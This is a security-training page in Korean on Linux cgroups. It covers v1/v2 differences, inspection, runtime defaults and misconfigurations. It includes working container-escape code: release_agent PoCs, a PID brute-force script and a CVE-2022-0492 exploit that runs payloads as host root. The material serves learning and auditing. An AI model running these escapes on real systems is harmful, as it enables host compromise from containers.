# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

Linux **control groups**는 계정(accounting), 제한(limiting), 우선순위 지정(prioritization), 정책 집행(policy enforcement)을 위해 프로세스를 그룹화하는 커널 메커니즘입니다. namespaces가 주로 리소스의 보기를 격리하는 것과 관련이 있다면, cgroups는 주로 해당 리소스의 집합이 소비할 수 있는 **얼마나**(how much)와, 경우에 따라 전혀 상호작용할 수 있는 **어떤 종류의 리소스**(which classes of resources)를 통제하는 역할을 합니다. 거의 모든 최신 runtime은 커널에 "이 프로세스들은 이 workload에 속하며, 이들에게 적용되는 리소스 규칙은 다음과 같다"고 알려줘야 하기 때문에, 사용자가 직접 보지 않더라도 containers는 항상 cgroups에 의존합니다.

이 때문에 container engines는 새 container를 자체 cgroup subtree에 배치합니다. 한 번 프로세스 트리가 그곳에 들어가면, runtime은 메모리 상한을 설정하고, PIDs 수를 제한하며, CPU 사용에 가중치를 부여하고, I/O를 조절하고, 장치 접근을 제한할 수 있습니다. 운영 환경에서는 다중 테넌트 안전성(multi-tenant safety)과 단순한 운영 위생(operational hygiene) 모두에 필수적입니다. 의미 있는 리소스 제어가 없는 container는 메모리를 고갈시키거나, 프로세스로 시스템을 범람시키거나, 호스트나 인접한 workloads를 불안정하게 만드는 방식으로 CPU와 I/O를 독점할 수 있습니다.

보안 관점에서 cgroups는 두 가지 측면에서 중요합니다. 첫째, 잘못되었거나 누락된 리소스 제한은 간단한 서비스 거부(denial-of-service) 공격을 가능하게 합니다. 둘째, 특히 오래된 **cgroup v1** 설정에서는 일부 cgroup 기능이 컨테이너 내부에서 쓰기가 가능할 때 강력한 breakout primitives를 만들어낸 사례가 역사를 통해 존재합니다.

## v1 Vs v2

현실에는 두 가지 주요 cgroup 모델이 있습니다. **cgroup v1**은 여러 controller hierarchies를 노출하며, 과거의 exploit writeups들은 종종 그곳에서 사용 가능한 이상하거나 때로는 지나치게 강력한 의미론(semantics)을 중심으로 이루어졌습니다. **cgroup v2**는 더 통합된 계층 구조와 일반적으로 더 깔끔한 동작을 도입합니다. 최신 배포판은 점점 cgroup v2를 선호하지만, 혼합(mixed) 또는 레거시 환경은 여전히 존재하므로 실제 시스템을 검토할 때 두 모델 모두 여전히 관련이 있습니다.

이 차이는 특히 **cgroup v1**에서의 **`release_agent`** 악용과 같은 유명한 container breakout 사례들이 매우 구체적으로 오래된 cgroup 동작에 묶여 있기 때문에 중요합니다. 블로그에서 cgroup exploit을 보고 이를 맹목적으로 최신의 cgroup v2 전용 시스템에 적용하면 대상에서 실제로 가능한 것을 오해할 가능성이 높습니다.

## 검사

현재 셸이 어느 위치에 속하는지 가장 빨리 확인하는 방법은:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` 파일은 현재 프로세스와 연관된 cgroup 경로를 보여줍니다. 최신 cgroup v2 호스트에서는 보통 통합 엔트리를 보게 됩니다. 구형 또는 하이브리드 호스트에서는 여러 개의 v1 컨트롤러 경로가 보일 수 있습니다. 경로를 알게 되면 `/sys/fs/cgroup` 아래의 해당 파일들을 검사하여 제한과 현재 사용량을 확인할 수 있습니다.

cgroup v2 호스트에서는 다음 명령들이 유용합니다:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
이 파일들은 어떤 controllers가 존재하고 어떤 것들이 자식 cgroups에 위임되었는지를 보여준다. 이 위임 모델은 rootless 및 systemd-managed 환경에서 중요하다. 이러한 환경에서는 runtime이 parent hierarchy가 실제로 위임하는 cgroup 기능의 하위 집합만 제어할 수 있을 수도 있다.

## Lab

cgroups를 실제로 관찰하는 한 가지 방법은 메모리 제한이 있는 container를 실행하는 것이다:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
PID 제한 컨테이너도 시도해볼 수 있습니다:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## 런타임 사용

Docker, Podman, containerd, and CRI-O는 정상 동작의 일부로 cgroups에 의존합니다. 차이점은 보통 cgroups를 사용하는지 여부가 아니라 **어떤 기본값을 선택하는지**, **systemd와 어떻게 상호작용하는지**, **rootless delegation이 어떻게 동작하는지**, 그리고 **구성의 어느 정도가 엔진 수준에서 제어되고 오케스트레이션 수준에서 제어되는지**에 관한 것입니다.

Kubernetes에서는 resource requests와 limits가 결국 노드의 cgroup 설정이 됩니다. Pod YAML에서 kernel의 강제 적용까지의 경로는 kubelet, CRI runtime, 그리고 OCI runtime을 거치지만, 최종적으로 규칙을 적용하는 것은 여전히 cgroups라는 kernel 메커니즘입니다. Incus/LXC 환경에서도 cgroups가 많이 사용되며, 특히 system containers가 종종 더 풍부한 process tree와 VM과 유사한 운영 기대를 노출하기 때문입니다.

## 구성 오류 및 탈출

고전적인 cgroup 보안 이야기는 쓰기 가능한 **cgroup v1 `release_agent`** 메커니즘입니다. 해당 모델에서는 공격자가 적절한 cgroup 파일에 쓸 수 있고, `notify_on_release`를 활성화하며, `release_agent`에 저장된 경로를 제어할 수 있다면, 그 cgroup이 비워질 때 kernel이 호스트의 initial namespaces에서 공격자가 선택한 경로를 실행할 수 있습니다. 그래서 이전의 분석들은 cgroup 컨트롤러의 쓰기 가능성, 마운트 옵션, 네임스페이스/권한 조건에 많은 주의를 기울였습니다.

`release_agent`가 사용 불가능하더라도 cgroup 관련 실수는 여전히 중요합니다. 지나치게 광범위한 device 접근은 컨테이너에서 호스트 장치에 접근할 수 있게 만들 수 있습니다. 메모리와 PID 제한이 없으면 단순한 코드 실행이 호스트 DoS로 이어질 수 있습니다. rootless 시나리오에서 약한 cgroup 위임은 런타임이 실제로 적용하지 못했는데도 방어자가 제한이 존재한다고 오해하게 만들 수 있습니다.

### `release_agent` 배경

`release_agent` 기법은 오직 **cgroup v1**에만 적용됩니다. 기본 아이디어는 cgroup의 마지막 프로세스가 종료되고 `notify_on_release=1`이 설정되면, kernel이 `release_agent`에 저장된 경로의 프로그램을 실행한다는 것입니다. 그 실행은 **host의 initial namespaces**에서 발생하며, 이것이 쓰기 가능한 `release_agent`를 컨테이너 탈출 프리미티브로 만드는 이유입니다.

### 이 기법이 작동하려면 공격자는 일반적으로 다음이 필요합니다:

- a writable **cgroup v1** hierarchy
- the ability to create or use a child cgroup
- the ability to set `notify_on_release`
- the ability to write a path into `release_agent`
- a path that resolves to an executable from the host point of view

### 고전적인 PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
이 PoC는 페이로드 경로를 `release_agent`에 쓰고, cgroup release를 트리거한 다음 호스트에서 생성된 출력 파일을 다시 읽습니다.

### 이해하기 쉬운 단계별 설명

같은 아이디어는 단계를 나누어 설명하면 더 이해하기 쉽습니다.

1. 쓰기 가능한 cgroup 생성 및 준비:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. 컨테이너 파일시스템에 해당하는 호스트 경로를 식별합니다:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. 호스트 경로에서 보이도록 payload를 배치한다:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup을 비워 실행을 유발:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
그 결과 payload가 호스트 측에서 host root privileges로 실행됩니다. 실제 exploit에서는 payload가 보통 proof file을 쓰거나, reverse shell을 생성하거나, 호스트 상태를 변경합니다.

### Relative Path Variant Using `/proc/<pid>/root`

일부 환경에서는 컨테이너 파일시스템으로의 호스트 경로가 명확하지 않거나 스토리지 드라이버에 의해 숨겨져 있을 수 있습니다. 이 경우 payload 경로는 `/proc/<pid>/root/...` 형태로 표현할 수 있으며, 여기서 `<pid>`는 현재 컨테이너의 프로세스에 해당하는 호스트 PID입니다. 이것이 relative-path brute-force variant의 기반입니다:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
여기서 중요한 요점은 무차별 자체가 아니라 경로 형태입니다: `/proc/<pid>/root/...` 는 직접적인 호스트 저장소 경로를 미리 알지 못하더라도 커널이 호스트 네임스페이스에서 컨테이너 파일시스템 내부의 파일을 해석하도록 합니다.

### CVE-2022-0492 변형

2022년에 CVE-2022-0492는 cgroup v1에서 `release_agent`에 쓰기할 때 **초기** 사용자 네임스페이스에서 `CAP_SYS_ADMIN`을 올바르게 확인하지 않았음을 보여주었습니다. 이로 인해 cgroup 계층을 마운트할 수 있는 컨테이너 프로세스가 호스트 사용자 네임스페이스에서 이미 권한을 가지지 않고도 `release_agent`에 쓸 수 있게 되어, 취약한 커널에서는 이 기법이 훨씬 더 접근 가능해졌습니다.

최소 익스플로잇:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
취약한 커널에서는 호스트가 `/proc/self/exe`를 호스트의 root 권한으로 실행합니다.

실제 악용을 위해, 환경이 여전히 쓰기 가능한 cgroup-v1 경로나 위험한 장치 접근을 노출하는지부터 확인하세요:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
만약 `release_agent`가 존재하고 쓰기 가능하다면, 이미 legacy-breakout 영역에 들어와 있습니다:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
cgroup 경로 자체가 탈출을 허용하지 않는다면, 다음으로 실용적인 사용은 종종 denial of service 또는 reconnaissance입니다:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
이 명령들은 워크로드가 fork-bomb을 수행하거나, 메모리를 과도하게 소비하거나, 쓰기 가능한 레거시 cgroup 인터페이스를 악용할 여지가 있는지를 빠르게 알려줍니다.

## 검사

대상(target)을 검토할 때 cgroup 검사의 목적은 어떤 cgroup 모델이 사용 중인지, container가 쓰기 가능한 controller paths를 볼 수 있는지, 그리고 `release_agent`와 같은 구식 breakout primitives가 관련이 있는지 여부를 파악하는 것입니다.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
주목할 점:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## 런타임 기본값

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 활성화됨 | 컨테이너는 자동으로 cgroups에 배치됩니다; 리소스 제한은 플래그로 설정하지 않으면 선택사항입니다 | `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` 생략; `--device`; `--privileged` |
| Podman | 기본적으로 활성화됨 | `--cgroups=enabled`가 기본값입니다; cgroup 네임스페이스 기본값은 cgroup 버전에 따라 달라집니다 (`private`는 cgroup v2에서, `host`는 일부 cgroup v1 환경에서) | `--cgroups=disabled`, `--cgroupns=host`, 디바이스 접근 완화, `--privileged` |
| Kubernetes | 런타임을 통해 기본적으로 활성화됨 | Pods와 컨테이너는 노드 런타임에 의해 cgroups에 배치됩니다; 세밀한 리소스 제어는 `resources.requests` / `resources.limits`에 따라 달라집니다 | 리소스 요청/제한 미설정, 특권 디바이스 접근, 호스트 수준 런타임 잘못된 구성 |
| containerd / CRI-O | 기본적으로 활성화됨 | cgroups는 정상적인 라이프사이클 관리의 일부입니다 | 디바이스 제어를 완화하거나 레거시 쓰기 가능한 cgroup v1 인터페이스를 노출하는 직접적인 런타임 구성 |

중요한 구분은 **cgroup 존재**는 일반적으로 기본값인 반면, **유용한 리소스 제약**은 명시적으로 구성하지 않으면 종종 선택사항이라는 점입니다.
